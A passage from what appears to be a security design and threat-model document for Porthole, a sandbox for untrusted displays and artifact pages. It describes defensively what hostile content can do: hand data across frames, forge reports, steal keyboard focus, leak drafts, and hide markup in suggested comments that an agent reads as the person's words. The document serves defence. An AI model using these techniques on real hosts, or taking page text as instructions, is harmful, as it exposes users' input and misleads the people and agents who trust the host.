  the page (P124). A host that previews code it doesn't trust words that fallback as its own, not as
  Porthole's or the person's sign-in.
- A page on another origin can still open the app by a navigation (a link, a frame of its own),
  which reaches the app's GET routes as any link does.
- A request with neither `Origin` nor `Sec-Fetch-Site` goes on: in browsers without fetch metadata
  (Safari before 16.4, older Chromium and Firefox) a sibling's GET subresource carries the app's
  cookie (GET CSRF, script-shaped responses); POSTs are still refused, by `Origin`. The app's own
  script can set a non-`HttpOnly` `__Host-porthole-<key>` where none exists: fixation with a session
  it holds (P101).
- Through `proxyTo`, `True-Client-IP` and `CF-Connecting-IP` reach the app as the client sent them.
- The app is a sibling of every other content origin, with no CSP of Porthole's beyond
  `frame-ancestors`: S3's cookie problems are easier from here.

### S7. Several displays on one page

**The rule: a page's egress is the union of its frames' egress.** Any frame can `postMessage` any
other frame on its page, and nothing inside a frame can stop it, so what one display was given can
be handed to the display with the widest network.

| Beside a display that reads the host's data or holds what the person types | |
| --- | --- |
| Closed egress, or Porthole's libraries | Fine. |
| `LIBRARY_CDNS` | Fine for ordinary data, not for highly sensitive data: every request path to its nine origins is a narrow channel read by their operators (S2). |
| An MCP view with `connectDomains` | Its domains become the page's. |
| `anyHttps` | No: any image URL is a way out. |
| url mode | No: the app's network is its own. |

- Porthole doesn't enforce this: `defineDisplays` takes any kinds together, and `frameSources` is
  the union of all of theirs. Group displays by page yourself.
- Where another app frames yours (`framedBy`, P141, P144), the outer page's frames are in the union
  too; grouping them is its authors' job, and its listeners must check `event.source` and
  `event.origin` (§6 "What every host must do").
- An opaque frame also inherits the page's own CSP, so a strict page narrows its opaque frames
  further (P058). A served frame has only its own policy.

**What sharing a scope costs, which Porthole does not stop.** The premise is a scope its author
controls (one person's artifact and its versions, one session's widgets), not one shared by people
who distrust each other. A scope's displays share one origin and run content there with
`allow-same-origin`, so one reaches another's document (`top[i]`) and its storage. The door stops a
sibling speaking Porthole's word for another display (P125), but a sibling can still, against
another display of its scope:

- spend its three restarts (`MAX_RESTARTS`) by reloading or wiping it, so its outcome is a `timeout`
  or, once they run out, `blocked: error` (a fallback, no link) the person may read as the display's
  own. It always has an outcome: restarts don't restart its clock (one `loadTimeoutMs` per loading
  episode, from its first run until an outcome), and a frame stopped after its restarts is `blocked:
  error`;
- deface it (rewrite its document), since they share an origin;
- read a sandbox-proxy view's HTML once the host has sent it into the view.

To deny these, put displays that distrust each other in **different scopes** (different origins);
there is no other way (P149). What a sibling cannot do is forge Porthole's own fallback (a sign-in
prompt with a link out): that is the door's wall (P125).

## 7. The display layer and the app runtime

### The display layer

What it is: the presets, the isolation, the egress walls, the shell, the bridge for the display's
host functions (S1's table, annotations, find in page, link labels) and the generated manual.

**Porthole guarantees** the two lines of [§4](#4-two-lines-of-defense) for each display except url
mode (S6), with S1–S5's open items. One config generates the CSP, the sandbox, the shell's wiring
and the manual, and a test holds them in agreement (`test/agreement.test.ts`), so the agent is told
what the sandbox allows. The leak suite tests each wall on three engines; `defineHostConformance`
runs it against a host's own page. **The host must** do what [every host](#what-every-host-must-do)
does, write the handlers (their effects are its own), and group displays by page (S7).

**The host's fallback** (P040, P124, P125). On a `blocked` outcome the host draws its own UI in
Porthole's wording (`frameFallback`: "Open this in a new tab to sign in", "You can't open this
anymore") with a link out of the page. The person takes it for the host's and Porthole's, so content
must not be able to summon it. A frame status (`porthole/notifications/frame-status`) doesn't say
who sent it: Porthole's status pages are documents of the frame's own window and origin, as content
is. So a `blocked` is the word of a page of Porthole's server, a gateway or the host's own pages,
never of an opaque frame or of content in a frame that speaks:

- **A served display** (a served shell, a page, a view through the sandbox proxy) shares its scope's
  origin with content that runs with `allow-same-origin` and can reach a new document there before
  its first script runs. So **no frame status from its own frame is ever taken** (each run, the
  first is dropped with one `frame-status` host error: a display trying to speak as Porthole), and
  its silence is a `timeout`, never a fallback. Its word is its **door**'s: a page of Porthole's on
  the same origin, in a hidden frame of the host's (`sandbox="allow-scripts"`, no name, `inert`,
  0×0) that shares an origin with no content and that no sandboxed sibling can navigate, read before
  the content frame is made (`open`, or `blocked` and why). A sibling can't read, navigate or speak
  from it. No timing rule can stand in for it: a `load` event is not a committed document.
- A `blocked` before any frame (`sign-in`, `denied`, `not-found`) is the host's own issue endpoint's
  refusal, mapped by `createHost`: the host's backend's word, as trustworthy as that endpoint.
- An **opaque frame**'s every status is the content's. A **url-mode app**'s is taken, so it can say
  any outcome (S6).
- A served location without a door (a server older than the host, a locator that drops it, a clean
  address framed as it is) is refused before any frame: `blocked: locate` and a `door` host error.
  Upgrade the server or Worker first, and resolve clean addresses through issue (S4). In a frame, a
  clean address gets a page with no script that goes nowhere, never the app's authorize or sign-in.
- A file set's entry must be a page (`.html`/`.htm`; `checkFileSet`, `admitFiles` and `lintFiles`
  refuse another). A set stored before that rule answers Porthole's `not-found` status page.

What remains are the costs of sharing a scope (S7).

**Annotations** (`annotate`, P053, P104, P107; mechanism and the control proving each point:
[DESIGN.md](DESIGN.md) § Annotations). The shell that draws marks and reports anchors shares the
content's realm.

- *What content learns.* All of each `show`: every mark's id, anchor and any `count`. Give ids that
  say nothing (never a person's name or a comment's words), and a count only where the page may know
  how many there are. Who commented and what they wrote stay in the host's UI outside the frame, as
  does what the person types there, unless the page takes the keyboard.
- *Drafts* (P107). A `kind: "draft"` mark is drawn apart: the page learns its viewer is writing a
  comment there before they post it. Accepted where the page has no way out: the host sends drafts
  only to their author's own frame (Porthole can't tell whose frame it is), the page already sees
  where the person selects, and closed egress keeps it off the network. Any channel the host opens
  carries a draft's existence, place and timing: `db` writes with `user` (a page can record "viewer
  A is drafting at section 3" for its author and other viewers before A posts, then tie A's posted
  comment to it), declared egress (an MCP App's `connectDomains`, an `egress` the host opened;
  `liveWidget` has none, P103), or a host function that sends the page's words somewhere. A host
  that sends drafts to such a page accepts that. A draft carries nothing else: its count is dropped
  before the frame (the page can't count drafts at an anchor unless sent a mark per draft), and its
  id is the host's (random). Drafts sent into a frame others see (a shared screen) tell that page,
  and what it draws for them, what their author hasn't posted.
- *What content can fake.* Any report: a selection while the host asks for one, where marks are,
  `activated` for any mark shown with a marker (a count, or a draft) with no click and any box;
  look-alike markers, or its own elements over Porthole's. The host takes a report only for what it
  asked and ids it shows, rebuilt within `ANNOTATION_LIMITS`, at 120 a minute, and drops `activated`
  for a mark without a marker or an id it doesn't show. No gesture is asked (P149; the host page's
  activation lasts 5 s after any gesture, so a timed fake would pass anyway): a page can open the
  host's view of a shown mark at any moment, under the person's pointer. The guard on that view (§6)
  is the defence.
- *Labels.* An anchor's `label` is the page's text, maybe words the person never sees (`alt`,
  `aria-label`, `title`). The host strips from every label what a person can't see: format, bidi and
  zero-width characters, default-ignorable code points, variation selectors, tags, private-use
  characters and controls (P105, without P100's exceptions for emoji and shaped letters). A text
  anchor's quote (`exact`) keeps them, to be found again. An anchor's `context` (P152: the headings
  above it, the name of the region around it) is the page's text of the same kind, read from its
  headings, `aria-label`s and tab names: nothing the host doesn't already take from the page as a
  quote or a label, and a page can put any words there, as it can in a heading. The host strips it
  as it strips a label, within `ANNOTATION_LIMITS` (6 headings, 80 characters each and for the
  region), and doesn't send it back into the frame. A quote, label or context handed to a model is
  the page's words, never instructions: a heading saying "Approved by legal" says only that the page
  says so.
- *Boxes* (`selected`, `activated`, `anchored`) are the page's word, clamped to the frame's viewport
  before the host hears them: the part inside is kept; a box wholly outside becomes one of no size
  on the nearest edge; a platform `viewport()` that answers no size, or throws, clamps every box to
  one of no size at the frame's corner. The page can't place the host's UI over the rest of the app,
  but picks any point in its frame: a positioning hint, never a fact. Boxes are in the frame's CSS
  px; a host that scales or transforms the frame maps them through that transform. Reading the
  frame's size per report, before the rate, forces a layout of the host's page per message, as a
  repeated `ui/initialize` already does (accepted, P105).
- *Places in the document* (P132, P133, P137, P150). `documentRect`, `lastLineDocumentRect` and an
  element pick's `pointDocument`, with the report's `scroll`, are checked (finite, within
  `ANNOTATION_LIMITS.coordinate`, sizes not negative; a malformed one, a last line or a point without
  `scroll`, or a point on a text selection, drops the report) but not clamped (a clamp would erase
  their purpose): the page chooses where the host's UI goes, outside the frame too (accepted; the
  host clips, §6). They reveal nothing else.
- *A followed selection* (P138, P140). `selectionTracked` boxes are checked and clamped likewise,
  taken only while the host follows the selection (otherwise dropped unread, without a refusal),
  within `tracked`'s 60 a second, and carry none of the page's words; `inView` is false unless the
  box reaches the frame's viewport as the host reads it. The page reads the host's word starting and
  ending the following, and `keepSelection` in every `start`: it learns when a composer is open on
  its selection (as `track` tells it which card is open, P112) and, before any pick, that the host
  will follow one. End the following on every close, kept or dismissed. The follow is drawn in the
  shell's closed layer, which takes no pointer; what is kept (the element picked, a copy of the
  range) is the page's own DOM, which tells it nothing new and which it can remove (`orphaned`). For
  a host that neither follows nor said `keepSelection`, the frame draws and keeps nothing after a
  pick.
- *A press on a marker*, against content that patches no built-in, reaches none of the content's
  handlers and moves neither focus nor a selection: content can't act on it or cancel it. Content
  can't read or reach inside the layer, but can tell a marker was pressed, and roughly where
  (`:hover`, `:active`, the pointer leaving its element, the frame's activation). On touch (P119) a
  marker takes a 44 by 44 px box around its bubble, so content loses a tap within 13 px of one. The
  pointer type is read from trusted events only, and a real `activated` needs a trusted click.
  Content that patches built-ins still can't hear a press or make the shell misread one (P105), but
  can reach the closed layer through `Element.prototype.matches`, and read and rewrite the markers.
  Nothing there is secret: the layer holds only what `show` sent.
- *The keyboard on a marker* (P133). A marker is a button with a tab stop. Enter and Space on it are
  stopped before the content and make a trusted click the content doesn't get; every other key, Tab
  too, is the page's. So markers join a focus order the content controls (accepted, reversing P104's
  point 6): it can take the focus from a marker, keep the person from reaching one, draw a
  look-alike, and tell that the person is on one. That gains it nothing: a marker's press only makes
  `activated`, which it can fake anyway; keys reach a marker only while the frame has the focus,
  never from the host; its own key events or `click()` make no trusted click. Assistive technology
  reads the page's words in a marker's name, in quotes that bound nothing (P134). A host can't rely
  on a marker being reached: its own list of marks is the keyboard way that holds.
- *Which input made an `activated`* (P134): the report doesn't say. The host's
  `document.activeElement`, which the page can't fake, says only that the focus is in the frame,
  where the page can put it itself. **The page can still forge `activated` while the person really
  is in the frame**: moving the keyboard into a view on this signal is §6's second exception, its
  gate keeping the next keys from posting.
- *Back to a marker* (P134, P135, P137). The page reads `focusMark` (an id it has; nothing comes
  back), so it learns a card closed; it can take the focus back or forge the word, gaining nothing a
  fake `activated` doesn't, and a host can't rely on the focus landing. The shell drops a late word
  unless the focus is in the frame (§6), checked through built-ins kept before content ran, so a
  word can't pull back a person gone on to a host's button. Accepted: a person who moves on within
  100 ms; a page that forges a fresh word or takes the focus itself (it then has the keyboard
  anyway); a word moving the focus from the page's own field onto a marker; and a forged `activated`
  between the host's close and the frame's move, while the focus is on the host's body, which finds
  no frame focused, so a view gated on "the frame had the focus" isn't gated by it. That view takes no focus and keeps keys out until the
  focus reaches the frame, so the keys go to the page and nothing is written.
- *Clearing the selection* (P115, P121). `clearSelection` goes host to frame only; nothing comes
  back. It adds no power (the page can clear or select its own text at any time, and reselect right
  after a clear), but the page sees it, so it learns when the person was done with its selection.
  Clear when the composer opens, on every close, or leave it to the person's next click; never only
  when a draft is added, which tells the page a draft exists there, and when (above all for a page
  `mayPassOn` says to keep drafts from).
- *What content can always do.* Hide, shrink, move or cover the layer; change its words so a mark is
  orphaned; flood the shared rate so real reports are refused; make the shell's work dear by its
  layout. Marks are found again and markers placed after each quiet run of changes, with a bounded
  number of hit tests per marker in view (300 marks with counts in view: about 20 ms a change; 200
  in a 3,000-line block: 25 to 50 ms; P105); in an opaque frame in the host's process that is the
  host's time too ([§5](#5-out-of-scope)). An honest page's follow-up reports share one clock: at
  most one a second, each only when its box moved.
- **So** `activated` opens the host's own view of a mark it already shows, within the frame's box
  (better: beside it), guarded as §6 says, and never acts on it (no post, submit, discard, resolve,
  delete or reply). An anchor or a rect decides where something is drawn, never who may see or do
  anything.

**Find in page** (`find`, P131). The host draws its own find bar; the shell finds and highlights
matches in a closed layer of its own, in the content's realm (how: [DESIGN.md](DESIGN.md) § Find in
page).

- *What content learns.* Each query the host sends (a bar that searches as the person types sends
  their typing, key by key), whether it is case-sensitive, each move between matches, when the bar
  clears, and whether the host draws its own bar. Queries are the person's words: a page with a way
  out (`connectDomains`, S5; egress a host opened; a carrier such as `db`, `mayPassOn`) can send
  them to its author. So `find` is declared, in no preset by default, and hosts send queries on a
  pause or Enter, not at every key (accepted by the product owner). A query is forgotten on a new
  run or other content, so another page never learns it from what matched.
- *What content can say.* Any count and current match (at most 1,000, whole numbers, the current one
  among them), any box in its frame (clamped as annotations' are), and an `updated` while a query is
  shown. The host takes an answer only for a query it asked, under its id; anything malformed is
  `"unsupported"` or a refusal. These are a find bar's numbers, never facts.
- *The shortcut.* While the host takes it (`find.takeShortcut(true)`), the shell cancels the
  browser's find on Cmd+F or Ctrl+F and says `requested`; a page that handles the key keeps it, and
  a page can say `requested` without it. The host takes `requested` only while the platform says the
  page's focus is in the frame, so a page without the keyboard can't open the host's bar (which
  takes focus) while the person types in the host's composer, and steer their next keys into
  queries. That holds where a page can't take the keyboard by itself (Firefox, without a gesture);
  on Chromium and WebKit a page can take it first, and then has the keys anyway. A real press is
  always in the frame, so the rule refuses none; where a platform can't tell, it passes.
- *What content can always do.* Hide, cover or move the layer; change its words so the count
  changes; reach the layer through patched built-ins; make the search dear (linear in its text; at
  most 1,000 matches kept and 10,000 looked at; queries of 256 characters; found again at most once
  a second while the content changes; of a burst, only the latest searched). In an opaque frame in
  the host's process that is the host's time too ([§5](#5-out-of-scope)).

**Link labels** (`linkLabels`, P151). The host gives a display titles for links to its own pages
(an artifact's links to other artifacts), as the person viewing may see them; the shell shows a
title in place of a bare link's address, as text, and tags every link to it (how: [DESIGN.md](DESIGN.md)
§ Link labels). The host labels from its own list; the page reports no links, and the frame says
nothing back.

- *What content learns.* Every label the host sends: each address and its title as this viewer may
  see it (another artifact's name, which the page's author may not know), and the tag. Page scripts
  read them as they read a find query: from the links' text, or from the message itself, which
  reaches the page's own listeners in the window the shell shares. A page with a way out (egress, a carrier such as `db`,
  `mayPassOn`) can send them to its author. So `linkLabels` is declared, in no preset by default,
  and the host sends only titles the viewer may see and the page may learn. Labels are forgotten on
  a new run or other content, so another page never learns the last one's.
- *What content can do.* Read, alter, hide or remove a label; give a link the label's words or
  another title itself; draw a lookalike link with any words; set or strip `data-porthole-label`; or
  write its own words over a label (the shell then leaves them). A label is a reader's convenience,
  never a trust signal: it says nothing about where a link goes, and the host never acts on one.
  The shell writes a label as text only (never markup), with its bidirectional controls taken out
  (by the host and the shell), so a title can neither add elements nor reorder what is drawn after
  it; a page that wants markup there has it anyway, in its own realm.
- *What content can always do.* Make the labelling dear: the shell looks at every link each time
  the document's changes settle (at most once a second while they go on), at most 500 labels; a page
  that says it is ready again and again is given the labels again at most 60 times a minute. In an
  opaque frame in the host's process that is the host's time too ([§5](#5-out-of-scope)).

**The keyboard** (P109, P123, P149; the accepted risk in §5, the host's side in §6). Content can
move focus into its frame (`element.focus()` and the like) while the person types in the host's
page. Nothing of Porthole's can stop that in the content's realm, and on Chromium and WebKit it
needs no gesture. The page gets the keys typed until the person sees their text stop appearing and
clicks back, and can keep them (`db`) or send them out through any egress it has; `selected` (a
composer opened on it) and draft marks (where the person is writing) tell it when they matter.
Browsers give a host no way to prevent the move or tell it from the person's own click into the
frame: the host's page sees no press inside a cross-site frame on full Chromium or Firefox. A guard
could only guess, and its guesses refused people's own clicks while a page could still pass for the
person, so Porthole has none, and nothing gives the keyboard back. What holds: content can't read
the host's page, its storage or another display, or move focus into a field of the host's, and gets
no key typed while the focus is in the host's page: only keys typed after its move and before the
person notices, never what is already in the host's composer.

### The app runtime

What it is: `config.runtime: "1"`, for inline widgets and artifact pages. A page reaches the host's
services through `porthole.use(name)`; without it there is no `porthole` global, and the config
can't name the runtime's own host functions. A host that only shows content can skip this section.
How it works: [DESIGN.md](DESIGN.md) § The capability runtime; how to wire it, with code:
[ADOPTING.md](ADOPTING.md) § The capability runtime.

**Porthole guarantees**, in the bridge, before any handler runs:
- A page reaches the built-ins its kind offers (`clipboard`, `links`, `downloads`, `comments`) and
  what it declared when published; anything else is refused (`undeclared`). The names it declares in
  `data` hold with a viewer and without one (P094). A page stored before runtime declarations (the
  host's `null` declaration) takes the legacy path: the built-ins and the old globals, none of
  `user`, `artifact`, `assets` and `db`.
- Each method has a least level (`view < interact < admin < owner`), held against the viewer's level
  from the host's `access`. A display without a viewer gets nothing above `view` and none of the
  runtime's own host functions.
- A version mounted with `intersectDeclarations(version's, current)` gets only what both
  declarations allow (P093).
- `db`: another person's `data/users/<id>` is refused at every level; `me` is the host's id for the
  viewer, and paths in answers say `data/users/me`, never that id.
- `artifact.publish` and `assets.delete` change the artifact for everyone, so by default they need a
  confirmation with their whole effect (a host's `methodGates` for them replace this; no proof of a
  click is asked, P149).
- A `db.batch` runs under the gates of each of its writes, a `db.watch` under those of `get` or
  `query`, as well as their own; a batch that needs a confirmation is confirmed once, whole (P094).
- Assets are served only to an access for their own artifact, after the host's check, except in
  **bearer mode** (`AssetStore.bearer`, an opt-in that serves an asset to anyone with its id). A
  code-typed asset runs as code only when an admin uploaded it where uploaded code may run, and only
  while the config still lets uploaded code run, asked at every load, in bearer mode too (where
  every artifact config must; P103); anything else is a download.
- `comments` is write-only: the page learns only whether the composer opened. It reaches the host's
  handler whenever the page calls it, at most 30 times a minute, with no proof of a click (P149);
  whether the composer opens is the handler's answer. A draft it gives (P108) is at most 2,000
  characters of text a person can see (P109), or it is refused before the handler: nothing invisible
  (zero-width, bidi and tag characters, controls but a new line and a tab; U+200C and U+200D only
  between two letters or marks, where Persian and the Indic scripts need them, never first, last,
  doubled, beside a space or punctuation, or in an emoji sequence; a variation selector after a
  pictograph is fine), no line or paragraph separator, not blank-looking, at most 32 blanks in a row
  and two blank lines in a row. A joiner between two letters that shapes nothing still draws as
  nothing (about a bit per letter boundary, measured): accepted, as P100 accepts it. The anchor's
  label and quote reach the handler without what a person can't see, and are refused if nothing
  visible is left.
- `defineRuntimeConformance` checks the host's handlers and, with `api`, its own API for `db`,
  `artifact` and `assets`, with a forged context (a viewer claiming to be the owner, no rules).

**The host must**
- Treat its API as the wall: check each call again from its own session and its own stored
  declaration, never from `context.viewer` or `context.declared`. Run `defineRuntimeConformance`
  with `api` in CI, against its real API.
- Say each viewer's level in `access`, keep public grants low, and handle abuse on shared pages
  (S4).
- Store a declaration per version, and mount a version with `intersectDeclarations(version's,
  current)`.
- Revoke with its per-request check (`authorize`) and `content.forget(…)`.
- Keep each person's data apart in its own stores, and refuse moved bases and versions
  (`Refused("conflict")`).
- Show a comment's draft (P108) whole, as the person's editable plain text in its own composer, and
  post it only on the person's own Send, never on the page's word. Once posted, the comment is the
  person's (mentions in it act as theirs), so they must see it all first (P109):
  - An open never replaces, appends to or moves what the person has typed, or the place they chose:
    while the composer holds their words, answer `false`, or show the page's words as a separate
    suggestion that takes no focus.
  - A composer the page filled takes no focus when it opens (what the person types for the page must
    not land in a postable comment), and doesn't send on Enter until the person has focused or
    edited it. It is a view the content brought (§6's guard): no press for 500 ms, Send not focused,
    beside the frame where it can.
  - Until the person edits it, it says the text is the page's ("Suggested by this page"), drawn by
    the host outside the frame. It never shows it as one of their own drafts: the host's own list of
    drafts, not the frame's markers (which a page can draw), is how a person finds theirs.
  - Nothing one click away in the draft's view (P107) or the composer posts, submits or discards.
  - Render a page-drafted comment as plain text, or show before Send what readers will see: markup a
    markdown renderer hides (an HTML comment, a link definition) is still read by an agent. Show the
    anchor's label and quote as isolated text (`<bdi>`, `dir="auto"`), and hand them to a model only
    as the page's words.

**Not guaranteed**
- Closed egress covers the network, not the host's services: what a page learns from `user`, or what
  a viewer types into it, it can store in `db`, where its author (and other viewers, as the page's
  rules allow) can read it.
- `db` rewrites only paths: an id the page stores inside a document's data is returned as stored.
- In bearer mode, assets are served by id alone, without the host's check.
- A draft is the page's words in the person's composer: posted unread, it says what the page chose,
  and an agent that reads the comment takes it as the person's. Porthole bounds what can hide in it
  (visible text, 2,000 characters) and how often it is asked (30 a minute); reading it is the
  person's job. A page opens the composer at a moment it chooses, with a press of the person's or
  with none (P149): the composer's duties above are the bound.

## 8. Not covered yet

These have no decision yet; until they do, they are the host's to cover:

- a check, at mount or in development, that the page sends its `frame-src` (S1: run
  `defineHostConformance`);
- a check of which displays share a page (S7: group them yourself);
- an interstitial, report and takedown hooks for public pages, and a `lintContent` rule for secrets
  (S4);
- refusing weak or example secrets, and a health answer that isn't derived from the secret (S3);
- dropping `True-Client-IP` and `CF-Connecting-IP`, and an SSRF example for `instance` (S6);
- a warning when the content domain isn't on the PSL (S3);
- a watchdog that unloads a frame that stops answering ([§5](#5-out-of-scope)).
